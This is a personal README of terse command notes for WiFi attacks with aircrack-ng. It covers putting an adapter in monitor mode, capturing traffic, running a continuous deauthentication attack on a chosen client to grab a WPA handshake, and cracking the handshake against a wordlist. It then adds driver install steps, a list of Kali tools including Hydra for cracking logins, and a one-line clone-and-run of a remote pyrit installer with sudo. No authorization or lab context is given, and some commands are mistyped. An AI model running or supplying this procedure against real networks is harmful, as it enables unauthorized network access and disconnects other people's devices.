# aircrack-ng-

https://www.youtube.com/watch?v=77cWBybyvV4
// this is for quadcomm adapter

iwconfig
ifconfig
airmon-ng check kill
airmon-ng start wlan0
iwconfig
airodump-ng wlan0mon
ctri c
airodump-ng -cX -w capture -d MACADD wlan0mon 
new root
aireplay-ng --deauth 0 -a MACADD -c DEVICEMACADD wlan0mon 
wait for WPA hadshake then stop deauth

ls
wireshark capture-X.cap 
-filter for eapol
airmon-ng stop wlan0mon 
iwconfig 
aircrack-ng capture-X.cap -w /usr/share/dict/words

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

https://github.com/aircrack-ng/rtl8188eus
//instalation 

    sudo apt update
    sudo apt upgrade
    sudo apt-get dist-upgrade
    reboot
    sudo apt-get install linux-headers-$(uname -r)
    sudo apt install bc
    sudo apt-get install build-essential
    sudo apt-get install libelf-dev
    sudo apt install dkms
    sudo rmmod r8188eu.ko
    git https://github.com/drygdryg/rtl8188eus (This works for me joy)
    cd rtl8188eus
    sudo -i
    echo 'blacklist r8188eu'|sudo tee -a '/etc/modprobe.d/realtek.conf'
    reboot
    cd rtl8188eus
    sudo make && make install
    reboot


// enter monitor mode

$ sudo airmon-ng check kill
$ sudo ip link set <interface> down
$ sudo iw dev <interface> set type monitor

//enter manage mode 

$ sudo iw dev <interface> set type managed
service NetworkManager restart 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 Things to do with kali linux
 
 1. nmap for information gathering. In other words, to get insights about the host, its IP address, OS detection, and similar network security details (like the number of open ports and what they are). firewall evasion and spoffing. 
 
 2. WPscan is WordPress security auditing tool.
 
 3. Hydra is for cracking login/password
 
 4. Maltego is an impressive data mining tool to analyze information online and connect the dots (if any). As per the information, it creates a directed graph to help analyze the link between those pieces of data. 

5. Apktook is  reverse engineering Android apps. 

6. Autopsy is a digital forensic tool to investigate what happened on your computer. Well, you can also use it to recover images from SD card. It is also being used by law enforcement officials. You can read the documentation to explore what you can do with it.

7. pyrit 
git clone https://github.com/hacker3983/pyrit-installer && cd pyrit-installer && sudo bash install.sh
